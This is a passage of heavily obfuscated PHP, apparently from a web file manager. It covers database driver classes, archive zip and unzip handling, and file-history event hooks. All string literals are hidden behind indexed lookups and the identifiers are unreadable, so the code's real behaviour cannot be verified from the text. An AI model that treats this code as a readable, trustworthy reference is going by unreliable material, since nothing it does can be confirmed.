$_SERVER[ñˆ‹ß¿÷]; if (!empty($»ÔÁŒÜÒ)) { $¹ôµÓ‚ƒ = $›¢¸ñ¯[906] . $»ÔÁŒÜÒ . $›¢¸ñ¯[907]; } else { $¹ôµÓ‚ƒ = $›¢¸ñ¯[908]; } $Å‘İ¡¬ = $this->query($¹ôµÓ‚ƒ); $¬œÒÚÔ… = array(); foreach ($Å‘İ¡¬ as $èäÔ¦®ô => $ûÀÜöÒõ) { $¬œÒÚÔ…[$èäÔ¦®ô] = current($ûÀÜöÒõ); } return $¬œÒÚÔ…; } public function replace($±úƒÎ”³, $ÊÔ‚ÕÍ = array()) { $Äáî”Ğ€ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($±úƒÎ”³ as $¤ˆó™Ö => $˜¥Ü¡£ş) { $ó«§©İ = $this->parseValue($˜¥Ü¡£ş); if (is_scalar($ó«§©İ)) { $üòª·¤‘[] = $ó«§©İ; $„ÂŞªÀ[] = $this->parseKey($¤ˆó™Ö); } } $¼º‘ÉŠÇ = $Äáî”Ğ€[909] . $this->parseTable($ÊÔ‚ÕÍ[$Äáî”Ğ€[279]]) . $Äáî”Ğ€[910] . implode($Äáî”Ğ€[50], $„ÂŞªÀ) . $Äáî”Ğ€[911] . implode($Äáî”Ğ€[50], $üòª·¤‘) . $Äáî”Ğ€[912]; return $this->execute($¼º‘ÉŠÇ); } public function insertAll($…Â™ñ›¡, $›ÈÙ°¦Î = array(), $ö‹®×òÖ = false) { $§µ««ÛÕ =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($…Â™ñ›¡[0])) { return !1; } $ÏµßÌû = array_keys($…Â™ñ›¡[0]); $ç¨Õµ = array(); foreach ($…Â™ñ›¡ as $ªÏÛßÛ) { $àç÷† = array(); foreach ($ªÏÛßÛ as $øİØ¯‹Š => $³Ïñ¦šÚ) { $³Ïñ¦šÚ = $this->parseValue($³Ïñ¦šÚ); if (is_scalar($³Ïñ¦šÚ)) { $àç÷†[] = $³Ïñ¦šÚ; } } $ç¨Õµ[] = $§µ««ÛÕ[260] . implode($§µ««ÛÕ[50], $àç÷†) . $§µ««ÛÕ[912]; } array_walk($ÏµßÌû, array($this, $§µ««ÛÕ[913])); $¥§Æš = ($ö‹®×òÖ ? $§µ««ÛÕ[914] : $§µ««ÛÕ[915]) . $§µ««ÛÕ[916] . $this->parseTable($›ÈÙ°¦Î[$§µ««ÛÕ[279]]) . $§µ««ÛÕ[910] . implode($§µ««ÛÕ[50], $ÏµßÌû) . $§µ««ÛÕ[917] . implode($§µ««ÛÕ[50], $ç¨Õµ); return $this->execute($¥§Æš); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $á¡¬Õ‡İ =& $_SERVER[ñˆ‹ß¿÷]; $this->error = mysql_errno() . $á¡¬Õ‡İ[4] . mysql_error($this->_linkID); if ($á¡¬Õ‡İ[12] != $this->queryStr) { $this->error .= LNG($á¡¬Õ‡İ[48]) . $this->queryStr; } think_trace($this->error, $á¡¬Õ‡İ[12], $á¡¬Õ‡İ[49]); return $this->error; } public function escapeString($úÁÍ‚»Ã) { if ($this->_linkID) { return mysql_real_escape_string($úÁÍ‚»Ã, $this->_linkID); } else { return mysql_escape_string($úÁÍ‚»Ã); } } public function parseKey(&$¦‚Àõ¿†, $§›š•Ëğ = true) { $›‰›îÙ =& $_SERVER[ñˆ‹ß¿÷]; if ($§›š•Ëğ) { $¦‚Àõ¿† = $this->parseKeyCheck($¦‚Àõ¿†); } if ($¦‚Àõ¿† != $›‰›îÙ[188] && !preg_match($›‰›îÙ[918], $¦‚Àõ¿†)) { $¦‚Àõ¿† = $›‰›îÙ[385] . trim($¦‚Àõ¿†, $›‰›îÙ[385]) . $›‰›îÙ[385]; } return $¦‚Àõ¿†; } } class DbMysqli extends Db { public function __construct($Ùæ£î’¼ = '') { $œß™¬›î =& $_SERVER[ñˆ‹ß¿÷]; if (!extension_loaded($œß™¬›î[919])) { think_exception(think_lang($œß™¬›î[14]) . $œß™¬›î[920]); } if (!empty($Ùæ£î’¼)) { $this->config = $Ùæ£î’¼; if (empty($this->config[$œß™¬›î[17]])) { $this->config[$œß™¬›î[17]] = $œß™¬›î[12]; } } } public function connect($£¬ÄÑ­ = '', $¸³ºŒÇ = 0) { $¯ÉÃœÁ’ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($this->linkID[$¸³ºŒÇ])) { if (empty($£¬ÄÑ­)) { $£¬ÄÑ­ = $this->config; } $this->linkID[$¸³ºŒÇ] = new mysqli($£¬ÄÑ­[$¯ÉÃœÁ’[893]], $£¬ÄÑ­[$¯ÉÃœÁ’[895]], $£¬ÄÑ­[$¯ÉÃœÁ’[896]], $£¬ÄÑ­[$¯ÉÃœÁ’[21]], $£¬ÄÑ­[$¯ÉÃœÁ’[894]] ? intval($£¬ÄÑ­[$¯ÉÃœÁ’[894]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $øõøõåÇ = $this->linkID[$¸³ºŒÇ]->server_version; $this->linkID[$¸³ºŒÇ]->query($¯ÉÃœÁ’[897] . think_config($¯ÉÃœÁ’[898]) . $¯ÉÃœÁ’[58]); if ($øõøõåÇ > $¯ÉÃœÁ’[899]) { $this->linkID[$¸³ºŒÇ]->query($¯ÉÃœÁ’[900]); } $this->connected = !0; if (1 != think_config($¯ÉÃœÁ’[22])) { unset($this->config); } } return $this->linkID[$¸³ºŒÇ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($´¼á¨ê) { $„àßâ›Ë =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´¼á¨ê; if ($this->queryID) { $this->free(); } think_action_status($„àßâ›Ë[23], 1); think_status($„àßâ›Ë[24]); $this->queryID = $this->_linkID->query($´¼á¨ê); if ($this->_linkID->more_results()) { while (($œ³è‘‚ = $this->_linkID->next_result()) != NULL) { $œ³è‘‚->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ê¬ğ’ğá) { $Î÷ÀˆÜ¼ =& $_SERVER[ñˆ‹ß¿÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ê¬ğ’ğá; if ($this->queryID) { $this->free(); } think_action_status($Î÷ÀˆÜ¼[25], 1); think_status($Î÷ÀˆÜ¼[24]); $™’½ª‰· = $this->_linkID->query($ê¬ğ’ğá); $this->debug(); if (!1 === $™’½ª‰·) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $´É©ó€ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$´É©ó€) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…¤Öìóí = $this->_linkID->rollback(); $this->transTimes = 0; if (!$…¤Öìóí) { $this->error(); return !1; } } return !0; } private function getAll() { $¬óŸô†˜ = array(); if ($this->numRows > 0) { for ($ú‹°»Ï¼ = 0; $ú‹°»Ï¼ < $this->numRows; $ú‹°»Ï¼++) { $¬óŸô†˜[$ú‹°»Ï¼] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¬óŸô†˜; } public function getFields($¬Ñ½‡Ó¥) { $ÓÇæÔ“ =& $_SERVER[ñˆ‹ß¿÷]; $Åşãë÷˜ = $this->query($ÓÇæÔ“[904] . $this->parseKey($¬Ñ½‡Ó¥)); $œÌ‹İÏı = array(); if ($Åşãë÷˜) { foreach ($Åşãë÷˜ as $Úî» => $ãªë«ñ) { $œÌ‹İÏı[$ãªë«ñ[$ÓÇæÔ“[31]]] = array($ÓÇæÔ“[32] => $ãªë«ñ[$ÓÇæÔ“[31]], $ÓÇæÔ“[33] => $ãªë«ñ[$ÓÇæÔ“[34]], $ÓÇæÔ“[35] => (bool) ($ãªë«ñ[$ÓÇæÔ“[36]] === $ÓÇæÔ“[12]), $ÓÇæÔ“[37] => $ãªë«ñ[$ÓÇæÔ“[38]], $ÓÇæÔ“[39] => strtolower($ãªë«ñ[$ÓÇæÔ“[40]]) == $ÓÇæÔ“[41], $ÓÇæÔ“[42] => strtolower($ãªë«ñ[$ÓÇæÔ“[43]]) == $ÓÇæÔ“[44]); } } return $œÌ‹İÏı; } public function getTables($“ÊŸªÊ¯ = '') { $ùë×”’ =& $_SERVER[ñˆ‹ß¿÷]; $‡»‚ÓÒ° = !empty($“ÊŸªÊ¯) ? $ùë×”’[906] . $“ÊŸªÊ¯ . $ùë×”’[907] : $ùë×”’[908]; $¤öµ”¢ = $this->query($‡»‚ÓÒ°); $ïæ÷˜»Í = array(); if ($¤öµ”¢) { foreach ($¤öµ”¢ as $´‚ÄÏ´ => $Çş´™õÊ) { $ïæ÷˜»Í[$´‚ÄÏ´] = current($Çş´™õÊ); } } return $ïæ÷˜»Í; } public function replace($Õşæ—Ù, $„à½˜©’ = array()) { $ëÏ´…¦ =& $_SERVER[ñˆ‹ß¿÷]; foreach ($Õşæ—Ù as $øÒè¤Èß => $¦ëßòù‡) { $ù£‘¾Ë² = $this->parseValue($¦ëßòù‡); if (is_scalar($ù£‘¾Ë²)) { $´Ìüœê[] = $ù£‘¾Ë²; $«ø ƒ¨Ğ[] = $this->parseKey($øÒè¤Èß); } } $õä¿Äş¬ = $ëÏ´…¦[909] . $this->parseTable($„à½˜©’[$ëÏ´…¦[279]]) . $ëÏ´…¦[910] . implode($ëÏ´…¦[50], $«ø ƒ¨Ğ) . $ëÏ´…¦[911] . implode($ëÏ´…¦[50], $´Ìüœê) . $ëÏ´…¦[912]; return $this->execute($õä¿Äş¬); } public function insertAll($ƒ€ŸŒŞ„, $ÍÌƒ–¡ = array(), $·ÍÇ¥Á• = false) { $«Î ¹ªƒ =& $_SERVER[ñˆ‹ß¿÷]; if (!is_array($ƒ€ŸŒŞ„[0])) { return !1; } $ù–½ùĞŞ = array_keys($ƒ€ŸŒŞ„[0]); $ü¢Û¢şó = array(); foreach ($ƒ€ŸŒŞ„ as $òşÓß¼Ï) { $«¶ÚÚ¹ = array(); foreach ($òşÓß¼Ï as $à˜İâ¾Ú => $µÅ¬Á™ê) { $µÅ¬Á™ê = $this->parseValue($µÅ¬Á™ê); if (is_scalar($µÅ¬Á™ê)) { $«¶ÚÚ¹[] = $µÅ¬Á™ê; } } $ü¢Û¢şó[] = $«Î ¹ªƒ[260] . implode($«Î ¹ªƒ[50], $«¶ÚÚ¹) . $«Î ¹ªƒ[912]; } array_walk($ù–½ùĞŞ, array($this, $«Î ¹ªƒ[913])); $ìé¬ò§ = $·ÍÇ¥Á• ? $«Î ¹ªƒ[914] : $«Î ¹ªƒ[915]; $±ÒøÃ±™ = $ìé¬ò§ . $«Î ¹ªƒ[916] . $this->parseTable($ÍÌƒ–¡[$«Î ¹ªƒ[279]]) . $«Î ¹ªƒ[910] . implode($«Î ¹ªƒ[50], $ù–½ùĞŞ) . $«Î ¹ªƒ[917] . implode($«Î ¹ªƒ[50], $ü¢Û¢şó); return $this->execute($±ÒøÃ±™); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $çí«Ğ¦ä =& $_SERVER[ñˆ‹ß¿÷]; $this->error = $this->_linkID->errno . $çí«Ğ¦ä[4] . $this->_linkID->error; if ($çí«Ğ¦ä[12] != $this->queryStr) { $this->error .= LNG($çí«Ğ¦ä[48]) . $this->queryStr; } think_trace($this->error, $çí«Ğ¦ä[12], $çí«Ğ¦ä[49]); return $this->error; } public function escapeString($Õâ¯ı˜‹) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Õâ¯ı˜‹); } else { return addslashes($Õâ¯ı˜‹); } } public function parseKey(&$“·¼ù±˜, $­ñş“Üá = true) { $¸ÇîÔîô =& $_SERVER[ñˆ‹ß¿÷]; if ($­ñş“Üá) { $“·¼ù±˜ = $this->parseKeyCheck($“·¼ù±˜); } if ($“·¼ù±˜ != $¸ÇîÔîô[188] && !preg_match($¸ÇîÔîô[918], $“·¼ù±˜)) { $“·¼ù±˜ = $¸ÇîÔîô[385] . trim($“·¼ù±˜, $¸ÇîÔîô[385]) . $¸ÇîÔîô[385]; } return $“·¼ù±˜; } } goto BƒÓóÄâæ‚; b¤‘¯Ø‡Ç§: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ÓáòÆõ; if (!$ÓáòÆõ) { $Ñûñ’Şë = IO::init($_SERVER[ñˆ‹ß¿÷][8]); } return $Ñûñ’Şë; } private static function iconvSystem($Ê‘õ­Âë) { return self::local()->iconvSystem($Ê‘õ­Âë); } private static function iconvApp($§ïïÀÉ‹) { return self::local()->iconvApp($§ïïÀÉ‹); } public static function zip($Åúµ…Ñ¶, $úıª‹¹ = "\172\151\160", $é›•˜« = '', $¿ÌÍƒ™ô = REPEAT_RENAME) { $‡«ÜÕˆŞ =& $_SERVER[ñˆ‹ß¿÷]; $şìŸØ§¨ = self::init($Åúµ…Ñ¶[0][$‡«ÜÕˆŞ[84]]); $³Í·§‘õ = self::info($Åúµ…Ñ¶[0][$‡«ÜÕˆŞ[84]]); $Â°Ñ÷„Á = !1; if (!$é›•˜« && $şìŸØ§¨->getType() == $‡«ÜÕˆŞ[106]) { $ÆÑ¢¤• = self::zipFileList($Åúµ…Ñ¶); } else { $Â°Ñ÷„Á = $é›•˜« ? $é›•˜« : TEMP_FILES . $‡«ÜÕˆŞ[1191] . time() . rand_string(8) . $‡«ÜÕˆŞ[8]; mk_dir($Â°Ñ÷„Á); $ÆÑ¢¤• = self::zipFileList($Åúµ…Ñ¶, $Â°Ñ÷„Á); } $éÓ¨¡Å€ = $³Í·§‘õ[$‡«ÜÕˆŞ[32]]; if (count($ÆÑ¢¤•) > 1) { $ıÚ••‰ = IO::info(IO::pathFather($³Í·§‘õ[$‡«ÜÕˆŞ[84]])); $éÓ¨¡Å€ = $ıÚ••‰[$‡«ÜÕˆŞ[32]]; } $Ç°Í½Ôù = $Â°Ñ÷„Á; if (!$Ç°Í½Ôù) { $Ç°Í½Ôù = get_path_father($³Í·§‘õ[$‡«ÜÕˆŞ[84]]); if (!$é›•˜« && $şìŸØ§¨->getType() == $‡«ÜÕˆŞ[106]) { $Ç°Í½Ôù = get_path_father($şìŸØ§¨->path); } $‹©ŸÓ¶ = IO::info($Ç°Í½Ôù); if (!$‹©ŸÓ¶[$‡«ÜÕˆŞ[202]]) { show_json(LNG($‡«ÜÕˆŞ[1192]), !1); } } $¤ë€­ä = $Ç°Í½Ôù . $éÓ¨¡Å€ . $‡«ÜÕˆŞ[10] . $úıª‹¹; $¤ë€­ä = get_filename_auto($¤ë€­ä, $‡«ÜÕˆŞ[12], $¿ÌÍƒ™ô); $™¤¡èÏ¯ = self::iconvSystem($¤ë€­ä); foreach ($ÆÑ¢¤• as $†œŸóë˜ => $¯ÀÍäÑ) { $ÆÑ¢¤•[$†œŸóë˜] = self::iconvSystem($¯ÀÍäÑ); } KodArchive::create($™¤¡èÏ¯, $ÆÑ¢¤•); if (!IO::exist($¤ë€­ä)) { if ($Â°Ñ÷„Á) { del_dir($Â°Ñ÷„Á); } show_json(LNG($‡«ÜÕˆŞ[1193]), !1); } if ($é›•˜« || !$Â°Ñ÷„Á) { if ($Â°Ñ÷„Á && strstr($Â°Ñ÷„Á, TEMP_FILES)) { $ÇãıÄ§‡ = $ÆÑ¢¤• = array(); recursion_dir($Ç°Í½Ôù, $ÇãıÄ§‡, $ÆÑ¢¤•, 0); foreach ($ÇãıÄ§‡ as $¥Úò¯İš) { del_dir($¥Úò¯İš); } foreach ($ÆÑ¢¤• as $É‡™”›) { if ($É‡™”› == $™¤¡èÏ¯) { continue; } del_file($É‡™”›); } } return $¤ë€­ä; } $†»¸úø = self::pathFather($³Í·§‘õ[$‡«ÜÕˆŞ[84]]); $ŒÛÓú¼× = self::move($¤ë€­ä, $†»¸úø, $¿ÌÍƒ™ô); if (!$ŒÛÓú¼×) { del_dir($Â°Ñ÷„Á); show_json(LNG($‡«ÜÕˆŞ[1193]), !1); } del_dir($Â°Ñ÷„Á); return $ŒÛÓú¼×; } public static function unzip($¬º¤Š, $ü±³”è– = "\x72\145\x70\x6c\141\143\145") { $úŞ¥¸¶å =& $_SERVER[ñˆ‹ß¿÷]; $Ü–ÓøÁ· = $¬º¤Š[$úŞ¥¸¶å[84]]; $Ë¶áƒµç = $¬º¤Š[$úŞ¥¸¶å[1194]]; if (!($´èäËÕÆ = parent::info($Ü–ÓøÁ·))) { show_json(LNG($úŞ¥¸¶å[1195]), !1); } if (!($Òİ‚¤™ = parent::infoFull($Ë¶áƒµç))) { $Ë¶áƒµç = parent::mkdir($Ë¶áƒµç); $Òİ‚¤™ = array($úŞ¥¸¶å[84] => $Ë¶áƒµç); } else { if (isset($Òİ‚¤™[$úŞ¥¸¶å[402]]) && trim($Òİ‚¤™[$úŞ¥¸¶å[84]], $úŞ¥¸¶å[8]) != trim($Ë¶áƒµç, $úŞ¥¸¶å[8])) { $¹·çÏÀ’ = KodIO::make($Òİ‚¤™[$úŞ¥¸¶å[432]]); $£°ò”Â‡ = parent::fileNameAuto($¹·çÏÀ’, $Òİ‚¤™[$úŞ¥¸¶å[32]], REPEAT_RENAME_FOLDER, !0); $Ë¶áƒµç = parent::mkdir($¹·çÏÀ’ . $£°ò”Â‡); $Òİ‚¤™ = array($úŞ¥¸¶å[84] => $Ë¶áƒµç); } } $Ë¶áƒµç = $Òİ‚¤™[$úŞ¥¸¶å[84]]; $¹Ó–™Äê = self::tmpFileName($´èäËÕÆ); $’ªğÏ…œ = TEMP_FILES . $¹Ó–™Äê; del_dir($’ªğÏ…œ); mk_dir($’ªğÏ…œ); $ï®çâó´ = self::fileExt($´èäËÕÆ); $éèÃ¦Ï± = $’ªğÏ…œ . $úŞ¥¸¶å[10] . $ï®çâó´; if (!@file_exists(self::iconvSystem($éèÃ¦Ï±))) { $¹É¡Ú¢® = self::localFilePath($Ü–ÓøÁ·, $ï®çâó´); $éèÃ¦Ï± = $¹É¡Ú¢® ? $¹É¡Ú¢® : parent::download($Ü–ÓøÁ·, $éèÃ¦Ï±); } $éèÃ¦Ï± = self::iconvSystem($éèÃ¦Ï±); $‡Æ”Ô¾È = isset($¬º¤Š[$úŞ¥¸¶å[1196]]) ? $¬º¤Š[$úŞ¥¸¶å[1196]] : $úŞ¥¸¶å[1197]; $„õÁ£ˆ = KodArchive::extract($éèÃ¦Ï±, $’ªğÏ…œ . $úŞ¥¸¶å[8], $‡Æ”Ô¾È); self::archiveExt(); if (!$„õÁ£ˆ[$úŞ¥¸¶å[1198]]) { show_json($úŞ¥¸¶å[1199] . $„õÁ£ˆ[$úŞ¥¸¶å[1200]], !1); } Hook::trigger($úŞ¥¸¶å[1201], $’ªğÏ…œ); recursion_dir($’ªğÏ…œ, $İáòö†¸, $‹şØÍ, 0); $Úş¶æ°â = array_merge($İáòö†¸, $‹şØÍ); foreach ($Úş¶æ°â as $¼ÕÙëàû) { $¼ÕÙëàû = self::iconvApp($¼ÕÙëàû); self::move($¼ÕÙëàû, $Ë¶áƒµç, $ü±³”è–); } del_dir($’ªğÏ…œ); if (!$¹É¡Ú¢®) { del_file($éèÃ¦Ï±); } return !0; } public static function unzipList($“‘áüÜ) { $¨‡ú¿š =& $_SERVER[ñˆ‹ß¿÷]; $¨Ö´Ö™á = $“‘áüÜ[$¨‡ú¿š[84]]; $èˆ›à­ç = isset($“‘áüÜ[$¨‡ú¿š[1202]]) ? $“‘áüÜ[$¨‡ú¿š[1202]] : -1; $ùêË„ø€ = 50000; if (request_url_safe($¨Ö´Ö™á)) { $³İÛé‡Ê = parse_url_query($¨Ö´Ö™á); if (!isset($³İÛé‡Ê[$¨‡ú¿š[84]])) { show_json($¨‡ú¿š[1203], !1); } } $…‚“»êê = isset($³İÛé‡Ê) ? $³İÛé‡Ê[$¨‡ú¿š[84]] : $¨Ö´Ö™á; $ŒÙšÛ» = self::info($…‚“»êê); $ÚÖÌñÔ’ = self::fileExt($ŒÙšÛ»); $ƒ–Ô­Üó = self::tmpFileName($ŒÙšÛ»); if (isset($³İÛé‡Ê)) { $÷”¿µª— = array($³İÛé‡Ê[$¨‡ú¿š[84]], $³İÛé‡Ê[$¨‡ú¿š[1202]], $³İÛé‡Ê[$¨‡ú¿š[32]]); $²ŞÆÛÀ÷ = md5(implode($¨‡ú¿š[11], $÷”¿µª—)) . $¨‡ú¿š[10] . get_path_ext($³İÛé‡Ê[$¨‡ú¿š[32]]); } else { $÷”¿µª— = array($ŒÙšÛ»[$¨‡ú¿š[32]], $ŒÙšÛ»[$¨‡ú¿š[84]], $ŒÙšÛ»[$¨‡ú¿š[76]]); $²ŞÆÛÀ÷ = md5(implode($¨‡ú¿š[11], $÷”¿µª—)) . $¨‡ú¿š[10] . $ÚÖÌñÔ’; } if ($èˆ›à­ç == -1) { $˜ÊÎÍ‘ß = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\151\145\167\57{$ƒ–Ô­Üó}\57{$²ŞÆÛÀ÷}\x2e\x6c\x6f\147"; $ù…šëè¤ = self::infoFull($˜ÊÎÍ‘ß); if ($ù…šëè¤) { $˜ÊÎÍ‘ß = $ù…šëè¤[$¨‡ú¿š[84]]; $î—ª‘¢Å = self::getContent($˜ÊÎÍ‘ß); if ($î—ª‘¢Å) { $ÄËÒ¹æÈ = json_decode($î—ª‘¢Å, !0); $ÄËÒ¹æÈ = is_array($ÄËÒ¹æÈ) ? $ÄËÒ¹æÈ : array(); if (count($ÄËÒ¹æÈ) >= $ùêË„ø€) { show_json(sprintf(LNG($¨‡ú¿š[1204]), count($ÄËÒ¹æÈ)), !1); } return $ÄËÒ¹æÈ; } } else { $˜ÊÎÍ‘ß = self::mkfile($˜ÊÎÍ‘ß); } } $ƒ¿¯Çª© = TEMP_FILES . $ƒ–Ô­Üó; if (!is_dir($ƒ¿¯Çª©)) { mk_dir($ƒ¿¯Çª©); } $ò‡ùĞ·å = $ƒ¿¯Çª© . $¨‡ú¿š[8] . $²ŞÆÛÀ÷; if (!@file_exists(self::iconvSystem($ò‡ùĞ·å))) { if (isset($³İÛé‡Ê)) { url_request($¨Ö´Ö™á, $¨‡ú¿š[1205], $ò‡ùĞ·å); } else { $¦›´ùçÏ = self::localFilePath($¨Ö´Ö™á, $ÚÖÌñÔ’); $ò‡ùĞ·å = $¦›´ùçÏ ? $¦›´ùçÏ : self::download($¨Ö´Ö™á, $ò‡ùĞ·å); } } $ò‡ùĞ·å = self::iconvSystem($ò‡ùĞ·å); if ($èˆ›à­ç >= 0) { $Ø²—âÀ« = isset($“‘áüÜ[$¨‡ú¿š[1206]]) ? $“‘áüÜ[$¨‡ú¿š[1206]] : !1; $¬İÉ¨Ö× = isset($“‘áüÜ[$¨‡ú¿š[32]]) ? $“‘áüÜ[$¨‡ú¿š[32]] : $¨‡ú¿š[12]; KodArchive::filePreview($ò‡ùĞ·å, $èˆ›à­ç, $Ø²—âÀ«, $¬İÉ¨Ö×); self::archiveExt(); die; } $¹Ş‚×’¢ = KodArchive::listContent($ò‡ùĞ·å); self::archiveExt(); del_dir($ƒ¿¯Çª©); if (!$¹Ş‚×’¢[$¨‡ú¿š[1198]]) { show_json($¹Ş‚×’¢[$¨‡ú¿š[1200]], !1); } $ÄËÒ¹æÈ = json_encode($¹Ş‚×’¢[$¨‡ú¿š[1200]]); self::setContent($˜ÊÎÍ‘ß, $ÄËÒ¹æÈ); if (count($¹Ş‚×’¢[$¨‡ú¿š[1200]]) >= $ùêË„ø€) { show_json(sprintf(LNG($¨‡ú¿š[1204]), count($¹Ş‚×’¢[$¨‡ú¿š[1200]])), !1); } return $¹Ş‚×’¢[$¨‡ú¿š[1200]]; } private static function fileExt($áÃ²»Ôù) { $¡ÚÅ¿ğ =& $_SERVER[ñˆ‹ß¿÷]; $ĞòìÀéû = $áÃ²»Ôù[$¡ÚÅ¿ğ[174]]; if ($ĞòìÀéû == $¡ÚÅ¿ğ[1207]) { $ûÔ´Â› = $¡ÚÅ¿ğ[1208]; if (substr($áÃ²»Ôù[$¡ÚÅ¿ğ[32]], -strlen($ûÔ´Â›)) == $ûÔ´Â›) { $ĞòìÀéû = $¡ÚÅ¿ğ[1209]; } } self::archiveExt($ĞòìÀéû); return $ĞòìÀéû; } private static function zipFileList($ß Ğª…Ù, $íÍÁè£ = false) { $¥’§ˆ§Ò =& $_SERVER[ñˆ‹ß¿÷]; $™Ü³ÊàÉ = array(); foreach ($ß Ğª…Ù as $ÉÃºßª•) { $¯„ÃÈ›ß = $ÉÃºßª•[$¥’§ˆ§Ò[84]]; if ($íÍÁè£) { $¯„ÃÈ›ß = self::copy($ÉÃºßª•[$¥’§ˆ§Ò[84]], $íÍÁè£, $¥’§ˆ§Ò[825]); } else { $éÖ°’¹Û = self::init($ÉÃºßª•[$¥’§ˆ§Ò[84]]); if ($éÖ°’¹Û->getType() == $¥’§ˆ§Ò[106]) { $¯„ÃÈ›ß = $éÖ°’¹Û->path; } } if ($¯„ÃÈ›ß && self::local()->exist($¯„ÃÈ›ß)) { $™Ü³ÊàÉ[$ÉÃºßª•[$¥’§ˆ§Ò[84]]] = $¯„ÃÈ›ß; } } if (!empty($™Ü³ÊàÉ)) { return array_values($™Ü³ÊàÉ); } show_json(LNG($¥’§ˆ§Ò[1173]), !1); } public static function tmpFileName($àÛ¡Å÷¡) { $‹±é£é =& $_SERVER[ñˆ‹ß¿÷]; $Û¬ş½Š = array($àÛ¡Å÷¡[$‹±é£é[32]], $àÛ¡Å÷¡[$‹±é£é[84]], $àÛ¡Å÷¡[$‹±é£é[76]], $àÛ¡Å÷¡[$‹±é£é[521]]); return md5(implode($‹±é£é[11], $Û¬ş½Š)); } private static function localFilePath($«É›ãÃ, $»äÙˆœƒ) { $ß„æÒºü =& $_SERVER[ñˆ‹ß¿÷]; if ($»äÙˆœƒ == $ß„æÒºü[1210] && strtoupper(substr(PHP_OS, 0, 3)) == $ß„æÒºü[1211]) { return !1; } $’òæ¬Á® = KodIO::parse($«É›ãÃ); if ($’òæ¬Á®[$ß„æÒºü[33]] == KodIO::KOD_SOURCE) { $ŠíäÂµ¤ = Model($ß„æÒºü[832])->fileInfoGet(KodIO::sourceID($«É›ãÃ)); if (!$ŠíäÂµ¤[$ß„æÒºü[84]]) { show_json($ß„æÒºü[1212], !1); } $«É›ãÃ = $ŠíäÂµ¤[$ß„æÒºü[84]]; } $Ğ¿‘ÊÖ± = self::init($«É›ãÃ); if ($Ğ¿‘ÊÖ±->pathParse[$ß„æÒºü[1158]]) { $«É›ãÃ = $Ğ¿‘ÊÖ±->pathParse[$ß„æÒºü[1158]]; $Ğ¿‘ÊÖ± = self::init($«É›ãÃ); } $úšàìó = $Ğ¿‘ÊÖ±->getType(); if ($úšàìó == $ß„æÒºü[106] || $úšàìó == $ß„æÒºü[1213]) { if (!$Ğ¿‘ÊÖ±->exist($Ğ¿‘ÊÖ±->path)) { show_json(LNG($ß„æÒºü[105]), !1); } return $Ğ¿‘ÊÖ±->path; } return !1; } private static function archiveExt($„ˆ¾Õšš = '') { $GLOBALS[$_SERVER[ñˆ‹ß¿÷][1214]] = $„ˆ¾Õšš; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ˆÑù×û¥ =& $_SERVER[ñˆ‹ß¿÷]; $ÒÆ”Ş‚Ç = $GLOBALS[$ˆÑù×û¥[6]][$ˆÑù×û¥[89]]; if ($ÒÆ”Ş‚Ç[$ˆÑù×û¥[1215]] != 1) { return; } if ($ÒÆ”Ş‚Ç[$ˆÑù×û¥[1216]] <= 0) { return; } if (isset($_REQUEST[$ˆÑù×û¥[1217]]) && $_REQUEST[$ˆÑù×û¥[1217]] == $ˆÑù×û¥[88]) { return; } Hook::bind($ˆÑù×û¥[1218], $ˆÑù×û¥[1219]); Hook::bind($ˆÑù×û¥[1220], $ˆÑù×û¥[1221]); Hook::bind($ˆÑù×û¥[1222], $ˆÑù×û¥[1223]); Hook::bind($ˆÑù×û¥[1224], $ˆÑù×û¥[1225]); Hook::bind($ˆÑù×û¥[1226], $ˆÑù×û¥[1227]); Hook::bind($ˆÑù×û¥[1228], $ˆÑù×û¥[1229]); } public static function eventBeforeUpload($û±Ü¥È‚) { if ($û±Ü¥È‚[3] && $û±Ü¥È‚[3] != REPEAT_REPLACE) { return; } $›óçğäâ = self::parsePath($û±Ü¥È‚[0]); if (!$›óçğäâ) { return; } self::add($›óçğäâ); } public static function eventBeforeEdit($æÚø©œÆ) { $ÏâÎ†İË = self::parsePath($æÚø©œÆ[0]); if (!$ÏâÎ†İË) { return; } self::add($ÏâÎ†İË); } public static function eventBeforeCopyFile($ÕåÎ§˜¶, $¿¶Ï¤‡‹, $Ú¢ı§Å, $Ñú¦‚ë, $Š¡ğ¤àì, $£Íé«õ˜) { $Ïğö§‘ï =& $_SERVER[ñˆ‹ß¿÷]; if (isset($Ú¢ı§Å->_data[$Ïğö§‘ï[1162]]) && $Ú¢ı§Å->_data[$Ïğö§‘ï[1162]]) { return; } $äâ·¡½ß = $Ú¢ı§Å->getPathOuter($Ñú¦‚ë); $Ã—Èû¡ò = self::parsePath($äâ·¡½ß); if (!$Ã—Èû¡ò) { return; } self::add($Ã—Èû¡ò); } public static function eventBeforeRename($”Œ›ĞŸÊ) { $®µÀŒ­• =& $_SERVER[ñˆ‹ß¿÷]; $š¿ÓÚÀ = self::parsePath($”Œ›ĞŸÊ[0]); if 